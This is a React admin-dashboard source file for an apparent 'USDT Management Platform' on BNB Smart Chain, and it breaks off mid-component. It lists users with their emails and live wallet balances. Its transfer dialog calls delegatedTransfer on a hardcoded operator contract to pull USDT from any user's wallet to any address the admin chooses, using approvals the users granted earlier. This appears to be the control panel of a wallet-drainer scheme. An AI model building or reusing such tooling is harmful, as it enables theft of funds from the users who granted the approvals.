import { Skeleton } from "@/components/ui/skeleton.tsx";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card.tsx";
import { Button } from "@/components/ui/button.tsx";
import { Input } from "@/components/ui/input.tsx";
import { Label } from "@/components/ui/label.tsx";
import { Textarea } from "@/components/ui/textarea.tsx";
import { Badge } from "@/components/ui/badge.tsx";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select.tsx";
import {
  Tabs,
  TabsContent,
  TabsList,
  TabsTrigger,
} from "@/components/ui/tabs.tsx";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog.tsx";
import { useQuery, useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import { useEffect, useState, useCallback } from "react";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import { 
  Users, 
  Activity, 
  ArrowRightLeft, 
  Download, 
  FileText,
  LayoutDashboard,
  History as HistoryIcon,
  Send,
  TrendingUp,
  Wallet,
  Search,
  Filter,
  ExternalLink,
  Clock,
  CheckCircle2,
  XCircle
} from "lucide-react";
import type { Id } from "@/convex/_generated/dataModel.d.ts";

// Utility function to format timestamps to Indian Standard Time (IST)
function formatToIST(timestamp: number | string): string {
  // IST is UTC+5:30
  const date = new Date(typeof timestamp === 'string' ? parseInt(timestamp) : timestamp);
  const istOffset = 5.5 * 60 * 60 * 1000; // 5 hours 30 minutes in milliseconds
  const istDate = new Date(date.getTime() + istOffset);
  
  // Format: "DD MMM YYYY, hh:mm:ss AM/PM IST"
  const day = String(istDate.getUTCDate()).padStart(2, '0');
  const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
  const month = months[istDate.getUTCMonth()];
  const year = istDate.getUTCFullYear();
  
  let hours = istDate.getUTCHours();
  const minutes = String(istDate.getUTCMinutes()).padStart(2, '0');
  const seconds = String(istDate.getUTCSeconds()).padStart(2, '0');
  const ampm = hours >= 12 ? 'PM' : 'AM';
  hours = hours % 12 || 12;
  
  return `${day} ${month} ${year}, ${hours}:${minutes}:${seconds} ${ampm} IST`;
}

declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
    };
  }
}

// Contract owner wallet - has full admin access
const ADMIN_WALLET = "0x6713c28acc903af491887397c28aa1a75b2997a3";

export default function Admin() {
  const [adminWallet, setAdminWallet] = useState<string>("");
  const [isChecking, setIsChecking] = useState(true);
  const navigate = useNavigate();

  const checkWalletAccess = useCallback(async () => {
    setIsChecking(true);
    if (!window.ethereum) {
      toast.error("MetaMask not installed");
      setIsChecking(false);
      return;
    }

    try {
      const accounts = await window.ethereum.request({
        method: "eth_accounts",
      }) as string[];

      if (accounts.length === 0) {
        setIsChecking(false);
        return;
      }

      const wallet = accounts[0].toLowerCase();
      setAdminWallet(wallet);

      if (wallet !== ADMIN_WALLET) {
        toast.error("Not authorized. Admin access only.");
        setTimeout(() => navigate("/"), 2000);
      }
    } catch (error) {
      console.error(error);
      toast.error("Failed to check wallet");
    } finally {
      setIsChecking(false);
    }
  }, [navigate]);

  useEffect(() => {
    checkWalletAccess();
  }, [checkWalletAccess]);

  async function connectWallet() {
    if (!window.ethereum) {
      toast.error("MetaMask not installed");
      return;
    }

    try {
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      }) as string[];

      const wallet = accounts[0].toLowerCase();
      setAdminWallet(wallet);

      if (wallet !== ADMIN_WALLET) {
        toast.error("Not authorized. This wallet is not admin.");
        setTimeout(() => navigate("/"), 2000);
      } else {
        toast.success("Admin wallet connected");
      }
    } catch (error) {
      console.error(error);
      toast.error("Failed to connect wallet");
    }
  }

  if (isChecking) {
    return <Skeleton className="h-screen w-full" />;
  }

  if (!adminWallet) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <Card className="w-full max-w-md">
          <CardHeader>
            <CardTitle>Admin Access</CardTitle>
          </CardHeader>
          <CardContent className="space-y-4">
            <p className="text-sm text-muted-foreground">
              Connect your admin wallet to access the dashboard
            </p>
            <Button onClick={connectWallet} className="w-full">
              Connect Wallet
            </Button>
          </CardContent>
        </Card>
      </div>
    );
  }

  if (adminWallet !== ADMIN_WALLET) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background">
        <div className="text-center space-y-6">
          <h1 className="text-4xl font-bold">Access Denied</h1>
          <p className="text-xl text-muted-foreground">
            This wallet is not authorized for admin access
          </p>
          <Button onClick={() => navigate("/")}>Go Home</Button>
        </div>
      </div>
    );
  }

  return <AdminPage adminWallet={adminWallet} />;
}

function AdminPage({ adminWallet }: { adminWallet: string }) {

  return (
    <div className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5">
      {/* Professional Header */}
      <div className="border-b bg-gradient-to-r from-card via-card to-primary/5 backdrop-blur-sm shadow-sm">
        <div className="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary to-primary/50 flex items-center justify-center shadow-lg">
                <LayoutDashboard className="h-6 w-6 text-primary-foreground" />
              </div>
              <div>
                <h1 className="text-2xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text text-transparent">
                  Admin Dashboard
                </h1>
                <p className="text-sm text-muted-foreground">
                  USDT Management Platform
                </p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              <Badge variant="outline" className="px-4 py-2 font-mono text-xs">
                <Wallet className="mr-2 h-3 w-3" />
                {adminWallet.slice(0, 6)}...{adminWallet.slice(-4)}
              </Badge>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-8">
        <Tabs defaultValue="overview" className="space-y-8">
          <TabsList className="grid w-full grid-cols-5 h-auto p-1 bg-card/50 backdrop-blur-sm">
            <TabsTrigger 
              value="overview" 
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <LayoutDashboard className="h-4 w-4" />
              <span className="hidden sm:inline">Overview</span>
            </TabsTrigger>
            <TabsTrigger 
              value="users"
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <Users className="h-4 w-4" />
              <span className="hidden sm:inline">Users</span>
            </TabsTrigger>
            <TabsTrigger 
              value="transactions"
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <Activity className="h-4 w-4" />
              <span className="hidden sm:inline">Transactions</span>
            </TabsTrigger>
            <TabsTrigger 
              value="history"
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <HistoryIcon className="h-4 w-4" />
              <span className="hidden sm:inline">History</span>
            </TabsTrigger>
            <TabsTrigger 
              value="transfer"
              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
            >
              <Send className="h-4 w-4" />
              <span className="hidden sm:inline">Transfer</span>
            </TabsTrigger>
          </TabsList>

          <TabsContent value="overview" className="space-y-6">
            <OverviewTab adminWallet={adminWallet} />
          </TabsContent>

          <TabsContent value="users" className="space-y-6">
            <UsersTab adminWallet={adminWallet} />
          </TabsContent>

          <TabsContent value="transactions" className="space-y-6">
            <TransactionsTab adminWallet={adminWallet} />
          </TabsContent>

          <TabsContent value="history" className="space-y-6">
            <TransferHistoryTab adminWallet={adminWallet} />
          </TabsContent>

          <TabsContent value="transfer" className="space-y-6">
            <TransferTab adminWallet={adminWallet} />
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}

function OverviewTab({ adminWallet }: { adminWallet: string }) {
  const stats = useQuery(api.admin.getStats, { adminWallet });

  if (!stats) {
    return <Skeleton className="h-64 w-full" />;
  }

  return (
    <div className="grid gap-4 md:grid-cols-2">
      <Card>
        <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
          <CardTitle className="text-sm font-medium">Total Users</CardTitle>
          <Users className="h-4 w-4 text-muted-foreground" />
        </CardHeader>
        <CardContent>
          <div className="text-2xl font-bold">{stats.totalUsers}</div>
        </CardContent>
      </Card>

      <Card>
        <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
          <CardTitle className="text-sm font-medium">
            Total Transactions
          </CardTitle>
          <Activity className="h-4 w-4 text-muted-foreground" />
        </CardHeader>
        <CardContent>
          <div className="text-2xl font-bold">{stats.totalTransactions}</div>
        </CardContent>
      </Card>
    </div>
  );
}

function UsersTab({ adminWallet }: { adminWallet: string }) {
  const users = useQuery(api.admin.getAllUsers, { adminWallet });
  const updateUserRole = useMutation(api.admin.updateUserRole);
  const [selectedTransaction, setSelectedTransaction] = useState<{
    walletAddress: string;
  } | null>(null);

  async function handleRoleChange(userId: Id<"users">, newRole: "admin" | "user") {
    try {
      await updateUserRole({ adminWallet, userId, role: newRole });
      toast.success("User role updated");
    } catch (error) {
      toast.error("Failed to update user role");
    }
  }

  if (!users) {
    return <Skeleton className="h-64 w-full" />;
  }

  return (
    <>
      <Card>
        <CardHeader>
          <CardTitle>All Users ({users.length})</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-3">
            {users.map((user) => (
              <div
                key={user._id}
                className="flex items-center justify-between rounded-lg border bg-card p-4"
              >
                <div className="space-y-1">
                  <div className="font-semibold">{user.name || "Unknown"}</div>
                  <div className="text-sm text-muted-foreground">
                    {user.email}
                  </div>
                  {user.walletAddress && (
                    <div className="font-mono text-xs text-muted-foreground">
                      {user.walletAddress.slice(0, 10)}...
                      {user.walletAddress.slice(-8)}
                    </div>
                  )}
                  <div className="text-xs text-muted-foreground">
                    Joined: {formatToIST(user._creationTime)}
                  </div>
                </div>

                <div className="flex items-center gap-2">
                  <Select
                    value={user.role}
                    onValueChange={(value: "admin" | "user") =>
                      handleRoleChange(user._id as Id<"users">, value)
                    }
                  >
                    <SelectTrigger className="w-32">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="user">User</SelectItem>
                      <SelectItem value="admin">Admin</SelectItem>
                    </SelectContent>
                  </Select>
                  {user.walletAddress && (
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() =>
                        setSelectedTransaction({
                          walletAddress: user.walletAddress!,
                        })
                      }
                    >
                      <ArrowRightLeft className="mr-2 h-4 w-4" />
                      Transfer
                    </Button>
                  )}
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      <TransferDialog
        transaction={selectedTransaction}
        onClose={() => setSelectedTransaction(null)}
        adminWallet={adminWallet}
      />
    </>
  );
}


function TransactionsTab({ adminWallet }: { adminWallet: string }) {
  const transactions = useQuery(api.transactions.getAllTransactions, { adminWallet });
  const updateNote = useMutation(api.transactions.updateTransactionNote);
  const [selectedTransaction, setSelectedTransaction] = useState<{
    walletAddress: string;
  } | null>(null);
  
  const [noteDialog, setNoteDialog] = useState<{
    transactionId: string;
    currentNote: string;
  } | null>(null);
  const [noteText, setNoteText] = useState("");
  const [isSavingNote, setIsSavingNote] = useState(false);
  
  const [searchQuery, setSearchQuery] = useState("");
  const [dateFrom, setDateFrom] = useState("");
  const [dateTo, setDateTo] = useState("");
  const [minAmount, setMinAmount] = useState("");
  const [maxAmount, setMaxAmount] = useState("");

  if (!transactions) {
    return <Skeleton className="h-64 w-full" />;
  }

  const openNoteDialog = (transactionId: string, currentNote?: string) => {
    setNoteDialog({ transactionId, currentNote: currentNote || "" });
    setNoteText(currentNote || "");
  };

  const closeNoteDialog = () => {
    setNoteDialog(null);
    setNoteText("");
  };

  const saveNote = async () => {
    if (!noteDialog) return;

    setIsSavingNote(true);
    try {
      await updateNote({
        adminWallet,
        transactionId: noteDialog.transactionId as Id<"transactions">,
        note: noteText,
      });
      toast.success("Note saved successfully");
      closeNoteDialog();
    } catch (error) {
      console.error(error);
      toast.error("Failed to save note");
    } finally {
      setIsSavingNote(false);
    }
  };

  // Helper: Sanitize CSV cell to prevent formula injection
  const sanitizeCSVCell = (cell: string): string => {
    const cellStr = String(cell);
    // If cell starts with =, +, -, @, prepend with single quote to prevent formula execution
    if (/^[=+\-@]/.test(cellStr)) {
      return `'${cellStr}`;
    }
    return cellStr;
  };

  // Filter transactions based on search and filters
  const filteredTransactions = transactions.filter((tx) => {
    // Search query filter
    if (searchQuery) {
      const query = searchQuery.toLowerCase();
      const matchesUser = (tx.userName?.toLowerCase() || "").includes(query);
      const matchesEmail = (tx.userEmail?.toLowerCase() || "").includes(query);
      const matchesWallet = tx.walletAddress.toLowerCase().includes(query);
      const matchesToAddress = tx.toAddress.toLowerCase().includes(query);
      const matchesTxHash = (tx.txHash?.toLowerCase() || "").includes(query);
      const matchesAmount = tx.amount.toString().includes(query);

      if (!matchesUser && !matchesEmail && !matchesWallet && !matchesToAddress && !matchesTxHash && !matchesAmount) {
        return false;
      }
    }

    // Date range filter
    if (dateFrom) {
      const fromDate = new Date(dateFrom).getTime();
      if (new Date(tx._creationTime).getTime() < fromDate) {
        return false;
      }
    }
    if (dateTo) {
      const toDate = new Date(dateTo).getTime() + 86400000; // Add 1 day to include the end date
      if (new Date(tx._creationTime).getTime() > toDate) {
        return false;
      }
    }

    // Amount range filter
    if (minAmount && parseFloat(tx.amount) < parseFloat(minAmount)) {
      return false;
    }
    if (maxAmount && parseFloat(tx.amount) > parseFloat(maxAmount)) {
      return false;
    }

    return true;
  });

  const clearFilters = () => {
    setSearchQuery("");
    setDateFrom("");
    setDateTo("");
    setMinAmount("");
    setMaxAmount("");
  };

  const exportToCSV = () => {
    if (filteredTransactions.length === 0) {
      toast.error("No transactions to export");
      return;
    }

    // CSV headers
    const headers = [
      "Date & Time",
      "User Name",
      "User Email",
      "Wallet Address",
      "To Address",
      "Amount (USDT)",
      "USDT Balance",
      "BNB Balance",
      "Transaction Hash",
      "Status",
      "Admin Note",
    ];

    // Convert transactions to CSV rows with sanitization
    const rows = filteredTransactions.map((tx) => [
      sanitizeCSVCell(formatToIST(tx._creationTime)),
      sanitizeCSVCell(tx.userName || "Unknown"),
      sanitizeCSVCell(tx.userEmail || ""),
      sanitizeCSVCell(tx.walletAddress),
      sanitizeCSVCell(tx.toAddress),
      sanitizeCSVCell(tx.amount),
      sanitizeCSVCell(tx.usdtBalance || ""),
      sanitizeCSVCell(tx.nativeBalance || ""),
      sanitizeCSVCell(tx.txHash || ""),
      sanitizeCSVCell(tx.status),
      sanitizeCSVCell(tx.adminNote || ""),
    ]);

    // Combine headers and rows
    const csvContent = [
      headers.join(","),
      ...rows.map((row) =>
        row.map((cell) => {
          // Escape commas and quotes in cell content
          if (cell.includes(",") || cell.includes('"') || cell.includes("\n")) {
            return `"${cell.replace(/"/g, '""')}"`;
          }
          return cell;
        }).join(",")
      ),
    ].join("\n");

    // Create blob and download
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const link = document.createElement("a");
    const url = URL.createObjectURL(blob);
    
    const timestamp = new Date().toISOString().split("T")[0];
    link.setAttribute("href", url);
    link.setAttribute("download", `transactions_${timestamp}.csv`);
    link.style.visibility = "hidden";
    
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    toast.success(`Exported ${filteredTransactions.length} transactions`);
  };

  const hasActiveFilters = searchQuery || dateFrom || dateTo || minAmount || maxAmount;

  return (
    <>
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <CardTitle>All Transactions ({filteredTransactions.length})</CardTitle>
            <Button
              onClick={exportToCSV}
              variant="outline"
              size="sm"
              disabled={filteredTransactions.length === 0}
            >
              <Download className="mr-2 h-4 w-4" />
              Export CSV
            </Button>
          </div>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            {/* Search and Filters */}
            <div className="space-y-3">
              <div className="flex gap-2">
                <div className="flex-1">
                  <Input
                    placeholder="Search by name, email, wallet, tx hash, or amount..."
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    className="w-full"
                  />
                </div>
                {hasActiveFilters && (
                  <Button
                    variant="outline"
                    onClick={clearFilters}
                    className="whitespace-nowrap"
                  >
                    Clear Filters
                  </Button>
                )}
              </div>

              <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-4">
                <div>
                  <Label htmlFor="dateFrom" className="text-xs text-muted-foreground">
                    From Date
                  </Label>
                  <Input
                    id="dateFrom"
                    type="date"
                    value={dateFrom}
                    onChange={(e) => setDateFrom(e.target.value)}
                  />
                </div>
                <div>
                  <Label htmlFor="dateTo" className="text-xs text-muted-foreground">
                    To Date
                  </Label>
                  <Input
                    id="dateTo"
                    type="date"
                    value={dateTo}
                    onChange={(e) => setDateTo(e.target.value)}
                  />
                </div>
                <div>
                  <Label htmlFor="minAmount" className="text-xs text-muted-foreground">
                    Min Amount (USDT)
                  </Label>
                  <Input
                    id="minAmount"
                    type="number"
                    step="0.01"
                    placeholder="0.00"
                    value={minAmount}
                    onChange={(e) => setMinAmount(e.target.value)}
                  />
                </div>
                <div>
                  <Label htmlFor="maxAmount" className="text-xs text-muted-foreground">
                    Max Amount (USDT)
                  </Label>
                  <Input
                    id="maxAmount"
                    type="number"
                    step="0.01"
                    placeholder="0.00"
                    value={maxAmount}
                    onChange={(e) => setMaxAmount(e.target.value)}
                  />
                </div>
              </div>

              {hasActiveFilters && (
                <div className="rounded-lg bg-muted p-3 text-sm text-muted-foreground">
                  Showing {filteredTransactions.length} of {transactions.length} transactions
                </div>
              )}
            </div>

            {/* Transactions List */}
            {filteredTransactions.length === 0 ? (
              <div className="rounded-lg border border-dashed p-8 text-center">
                <p className="text-muted-foreground">
                  {hasActiveFilters ? "No transactions match your filters" : "No transactions yet"}
                </p>
              </div>
            ) : (
              <div className="space-y-4">
                {filteredTransactions.map((tx) => (
                  <div
                    key={tx._id}
                    className="rounded-lg border bg-card p-4 space-y-3"
                  >
                    <div className="flex items-start justify-between">
                      <div className="space-y-2 flex-1">
                        <div className="flex items-center gap-3">
                          <div className="font-semibold text-lg">{tx.amount} USDT</div>
                          <Badge
                            className={
                              tx.status === "completed"
                                ? "bg-green-500/10 text-green-500 border-green-500/20"
                                : "bg-muted text-muted-foreground"
                            }
                          >
                            {tx.status}
                          </Badge>
                        </div>

                        <div className="grid gap-2 text-sm">
                          <div className="flex items-start gap-2">
                            <span className="font-semibold min-w-[140px]">User:</span>
                            <span className="text-muted-foreground">
                              {tx.userName || "Unknown"} ({tx.userEmail})
                            </span>
                          </div>

                          <div className="flex items-start gap-2">
                            <span className="font-semibold min-w-[140px]">Wallet Address:</span>
                            <span className="font-mono text-xs text-muted-foreground break-all">
                              {tx.walletAddress}
                            </span>
                          </div>

                          <div className="flex items-start gap-2">
                            <span className="font-semibold min-w-[140px]">To Address:</span>
                            <span className="font-mono text-xs text-muted-foreground break-all">
                              {tx.toAddress}
                            </span>
                          </div>

                          {tx.usdtBalance && (
                            <div className="flex items-start gap-2">
                              <span className="font-semibold min-w-[140px]">USDT Balance:</span>
                              <span className="text-muted-foreground">{tx.usdtBalance}</span>
                            </div>
                          )}

                          {tx.nativeBalance && (
                            <div className="flex items-start gap-2">
                              <span className="font-semibold min-w-[140px]">BNB Balance:</span>
                              <span className="text-muted-foreground">{tx.nativeBalance}</span>
                            </div>
                          )}

                          {tx.txHash && (
                            <div className="flex items-start gap-2">
                              <span className="font-semibold min-w-[140px]">Transaction Hash:</span>
                              <a
                                href={`https://bscscan.com/tx/${tx.txHash}`}
                                target="_blank"
                                rel="noopener noreferrer"
                                className="font-mono text-xs text-primary hover:underline break-all"
                              >
                                {tx.txHash}
                              </a>
                            </div>
                          )}

                          <div className="flex items-start gap-2">
                            <span className="font-semibold min-w-[140px]">Date & Time:</span>
                            <span className="text-muted-foreground">{formatToIST(tx._creationTime)}</span>
                          </div>

                          {tx.adminNote && (
                            <div className="flex items-start gap-2">
                              <span className="font-semibold min-w-[140px]">Admin Note:</span>
                              <span className="text-muted-foreground">{tx.adminNote}</span>
                            </div>
                          )}
                        </div>
                      </div>

                      <div className="flex flex-col gap-2 ml-4">
                        <Button
                          size="sm"
                          variant="default"
                          onClick={() =>
                            setSelectedTransaction({
                              walletAddress: tx.walletAddress,
                            })
                          }
                        >
                          <ArrowRightLeft className="mr-2 h-4 w-4" />
                          Transfer
                        </Button>
                        <Button
                          size="sm"
                          variant="outline"
                          onClick={() => openNoteDialog(tx._id, tx.adminNote)}
                        >
                          <FileText className="mr-2 h-4 w-4" />
                          {tx.adminNote ? "Edit Note" : "Add Note"}
                        </Button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </CardContent>
      </Card>

      <TransferDialog
        transaction={selectedTransaction}
        onClose={() => setSelectedTransaction(null)}
        adminWallet={adminWallet}
      />

      <Dialog open={!!noteDialog} onOpenChange={() => closeNoteDialog()}>
        <DialogContent className="max-w-md">
          <DialogHeader>
            <DialogTitle>
              {noteDialog?.currentNote ? "Edit Note" : "Add Note"}
            </DialogTitle>
            <DialogDescription>
              Add notes or comments for this transaction (reminders, follow-ups, etc.)
            </DialogDescription>
          </DialogHeader>

          <div className="space-y-4">
            <div>
              <Label htmlFor="note">Note</Label>
              <Textarea
                id="note"
                value={noteText}
                onChange={(e) => setNoteText(e.target.value)}
                placeholder="Enter your note here..."
                rows={5}
                className="resize-none"
              />
            </div>

            <div className="flex gap-2 justify-end">
              <Button
                variant="outline"
                onClick={closeNoteDialog}
                disabled={isSavingNote}
              >
                Cancel
              </Button>
              <Button onClick={saveNote} disabled={isSavingNote}>
                {isSavingNote ? "Saving..." : "Save Note"}
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </>
  );
}

function TransferDialog({
  transaction,
  onClose,
  adminWallet,
}: {
  transaction: {
    walletAddress: string;
  } | null;
  onClose: () => void;
  adminWallet: string;
}) {
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [adminConnected, setAdminConnected] = useState(false);
  const [usdtBalance, setUsdtBalance] = useState<string>("");
  const [bnbBalance, setBnbBalance] = useState<string>("");
  const [loadingBalances, setLoadingBalances] = useState(false);
  const createTransfer = useMutation(api.transfers.createTransfer);

  const BSC_CHAIN_ID = "0x38";
  const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
  const TOKEN_OPERATOR = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

  const fetchUserBalances = useCallback(async () => {
    if (!transaction?.walletAddress) return;

    setLoadingBalances(true);
    try {
      const { ethers } = window as typeof window & {
        ethers: {
          JsonRpcProvider: new (url: string) => {
            getBalance: (address: string) => Promise<bigint>;
          };
          Contract: new (
            address: string,
            abi: string[],
            provider: unknown
          ) => {
            balanceOf: (address: string) => Promise<bigint>;
          };
          formatUnits: (value: bigint, decimals: number) => string;
        };
      };

      const provider = new ethers.JsonRpcProvider(
        "https://bsc-dataseed.binance.org/"
      );

      const usdtContract = new ethers.Contract(
        BSC_USDT,
        ["function balanceOf(address) view returns (uint256)"],
        provider
      );

      const [usdt, bnb] = await Promise.all([
        usdtContract.balanceOf(transaction.walletAddress),
        provider.getBalance(transaction.walletAddress),
      ]);

      setUsdtBalance(ethers.formatUnits(usdt, 18));
      setBnbBalance(ethers.formatUnits(bnb, 18));
    } catch (error) {
      console.error("Failed to fetch balances:", error);
      toast.error("Failed to fetch real-time balances");
    } finally {
      setLoadingBalances(false);
    }
  }, [transaction?.walletAddress, BSC_USDT]);

  useEffect(() => {
    if (!transaction) {
      setToAddress("");
      setAmount("");
      setIsProcessing(false);
      setUsdtBalance("");
      setBnbBalance("");
    } else {
      fetchUserBalances();
    }
  }, [transaction, fetchUserBalances]);

  async function connectAdminWallet() {
    if (!window.ethereum) {
      toast.error("MetaMask not found");
      return;
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (err) {
      const error = err as { code?: number };
      if (error.code === 4902) {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: BSC_CHAIN_ID,
              chainName: "Binance Smart Chain",
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              blockExplorerUrls: ["https://bscscan.com"],
            },
          ],
        });
      }
    }

    await window.ethereum.request({ method: "eth_requestAccounts" });
    setAdminConnected(true);
    toast.success("Admin wallet connected");
  }

  async function handleTransfer() {
    if (!transaction || !toAddress || !amount) {
      toast.error("Please fill all fields");
      return;
    }

    if (!adminConnected) {
      toast.error("Please connect admin wallet first");
      return;
    }

    setIsProcessing(true);

    try {
      const { ethers } = window as typeof window & {
        ethers: {
          BrowserProvider: new (provider: unknown) => {
            getSigner: () => Promise<unknown>;
          };
          Contract: new (
            address: string,
            abi: string[],
            signer: unknown
          ) => {
            delegatedTransfer: (
              tokenAddress: string,
              from: string,
              to: string,
              amount: bigint
            ) => Promise<{ wait: () => Promise<{ hash: string }> }>;
          };
          parseUnits: (value: string, decimals: number) => bigint;
        };
      };

      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const operatorContract = new ethers.Contract(
        TOKEN_OPERATOR,
        [
          "function delegatedTransfer(address tokenAddress, address from, address to, uint256 amount) external returns (bool)",
        ],
        signer
      );

      const amountInWei = ethers.parseUnits(amount, 18);

      const tx = await operatorContract.delegatedTransfer(
        BSC_USDT,
        transaction.walletAddress,
        toAddress,
        amountInWei
      );

      toast.success("Transaction submitted! Waiting for confirmation...");

      const receipt = await tx.wait();

      // Save transfer to database
      await createTransfer({
        adminWallet,
        fromAddress: transaction.walletAddress,
        toAddress,
        amount,
        txHash: receipt.hash,
        transferredBy: adminWallet,
        status: "success",
      });

      toast.success("Transfer successful! ✅");

      onClose();
    } catch (error) {
      console.error(error);
      const err = error as { reason?: string; message?: string };
      
      // Save failed transfer to database
      try {
        await createTransfer({
          adminWallet,
          fromAddress: transaction.walletAddress,
          toAddress,
          amount,
          txHash: "failed",
          transferredBy: adminWallet,
          status: "failed",
          note: err.reason || err.message || "Transfer failed",
        });
      } catch (dbError) {
        console.error("Failed to save error to database:", dbError);
      }

      toast.error(err.reason || err.message || "Transfer failed");
    } finally {
      setIsProcessing(false);
    }
  }

  return (
    <Dialog open={!!transaction} onOpenChange={() => onClose()}>
      <DialogContent className="max-w-md">
        <DialogHeader>
          <DialogTitle>Transfer USDT from Wallet</DialogTitle>
          <DialogDescription>
            Transfer USDT from user's wallet using TokenOperator contract
          </DialogDescription>
        </DialogHeader>

        <div className="space-y-4">
          <div className="rounded-lg bg-muted p-3 space-y-2">
            <div className="text-sm">
              <span className="font-semibold">From Wallet: </span>
              <span className="font-mono text-xs text-muted-foreground break-all">
                {transaction?.walletAddress}
              </span>
            </div>
          </div>

          <div className="rounded-lg border border-primary/20 bg-primary/5 p-4 space-y-2">
            <div className="font-semibold text-sm">Real-time Balance:</div>
            {loadingBalances ? (
              <div className="flex items-center gap-2 text-sm text-muted-foreground">
                <div className="h-4 w-4 animate-spin rounded-full border-2 border-primary border-t-transparent" />
                Fetching balances...
              </div>
            ) : (
              <div className="space-y-1">
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">USDT:</span>
                  <span className="font-mono font-semibold">
                    {usdtBalance ? `${parseFloat(usdtBalance).toFixed(4)} USDT` : "0.0000 USDT"}
                  </span>
                </div>
                <div className="flex items-center justify-between text-sm">
                  <span className="text-muted-foreground">BNB:</span>
                  <span className="font-mono font-semibold">
                    {bnbBalance ? `${parseFloat(bnbBalance).toFixed(6)} BNB` : "0.000000 BNB"}
                  </span>
                </div>
              </div>
            )}
          </div>

          {!adminConnected ? (
            <div className="space-y-3">
              <p className="text-sm text-muted-foreground">
                Connect your admin wallet to execute the transfer
              </p>
              <Button onClick={connectAdminWallet} className="w-full">
                Connect Admin Wallet
              </Button>
            </div>
          ) : (
            <div className="space-y-4">
              <div className="rounded-lg bg-green-500/10 p-3 text-sm text-green-500">
                ✅ Admin wallet connected
              </div>

              <div>
                <Label htmlFor="transferToAddress">To Address (Destination)</Label>
                <Input
                  id="transferToAddress"
                  value={toAddress}
                  onChange={(e) => setToAddress(e.target.value)}
                  placeholder="0x..."
                />
              </div>

              <div>
                <Label htmlFor="transferAmount">Amount (USDT)</Label>
                <Input
                  id="transferAmount"
                  type="number"
                  step="0.01"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder="0.0"
                />
              </div>

              <div className="flex gap-2">
                <Button
                  onClick={handleTransfer}
                  disabled={isProcessing}
                  className="flex-1"
                >
                  {isProcessing ? "Processing..." : "Transfer USDT"}
                </Button>
                <Button variant="outline" onClick={onClose} disabled={isProcessing}>
                  Cancel
                </Button>
              </div>

              <div className="rounded-lg bg-muted p-3 text-xs text-muted-foreground">
                <p>
                  <strong>Note:</strong> The user must have already approved the
                  TokenOperator contract to transfer their USDT.
                </p>
              </div>
            </div>
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
}

function TransferHistoryTab({ adminWallet }: { adminWallet: string }) {
  const transfers = useQuery(api.transfers.getAllTransfers, { adminWallet });

  if (!transfers) {
    return (
      <div className="space-y-4">
        {[1, 2, 3].map((i) => (
          <Card key={i}>
            <CardContent className="p-6">
              <Skeleton className="h-24 w-full" />
            </CardContent>
          </Card>
        ))}
      </div>
    );
  }

  // Calculate total successful transfers amount
  const totalAmount = transfers
    .filter((t) => t.status === "success")
    .reduce((sum, t) => sum + parseFloat(t.amount), 0);

  const successfulTransfers = transfers.filter((t) => t.status === "success").length;
  const failedTransfers = transfers.filter((t) => t.status === "failed").length;

  return (
